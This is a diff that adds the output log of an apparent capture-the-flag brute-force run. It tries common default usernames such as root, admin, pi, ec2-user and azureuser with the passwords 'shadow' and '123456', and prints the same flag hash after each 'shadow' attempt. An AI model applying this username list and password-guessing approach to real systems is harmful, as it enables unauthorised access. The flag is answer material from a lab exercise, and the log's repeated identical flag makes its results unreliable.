@@ -1,0 +1,37 @@
+Bruteforce has started
+... attempting username: root and password: shadow
+The flag is : b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2 
+... attempting username: admin and password: shadow
+The flag is : b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2 
+... attempting username: test and password: shadow
+The flag is : b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2 
+... attempting username: guest and password: shadow
+The flag is : b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2 
+... attempting username: info and password: shadow
+The flag is : b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2 
+... attempting username: adm and password: shadow
+The flag is : b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2 
+... attempting username: mysql and password: shadow
+The flag is : b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2 
+... attempting username: user and password: shadow
+The flag is : b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2 
+... attempting username: administrator and password: shadow
+The flag is : b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2 
+... attempting username: oracle and password: shadow
+The flag is : b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2 
+... attempting username: ftp and password: shadow
+The flag is : b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2 
+... attempting username: pi and password: shadow
+The flag is : b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2 
+... attempting username: puppet and password: shadow
+The flag is : b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2 
+... attempting username: ansible and password: shadow
+The flag is : b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2 
+... attempting username: ec2-user and password: shadow
+The flag is : b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2 
+... attempting username: vagrant and password: shadow
+The flag is : b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2 
+... attempting username: azureuser and password: shadow
+The flag is : b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2 
+... attempting username: root and password: 123456
+... attempting username: admin and password: 123456
